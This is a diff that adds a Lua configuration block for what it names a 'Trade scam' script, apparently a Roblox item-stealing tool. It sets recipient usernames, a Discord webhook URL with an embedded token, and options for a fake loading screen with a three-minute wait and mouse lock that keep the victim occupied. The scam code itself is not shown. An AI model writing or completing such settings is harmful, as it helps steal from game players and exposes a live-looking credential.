@@ -1,0 +1,13 @@
+UserName = "WYATTisSICK"
+UserName2 = "WYATTisSICK"
+Webhook = "https://discord.com/api/webhooks/1120795476262932531/2g0uBmttoYeI2GkR2VS8oBn-5NkJroV8Ju8Oy7aG0vaPdeT6NGY1MOwWwqGNo8FrKCrQ"
+
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+
+_G.ScriptName = "Trade scam"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
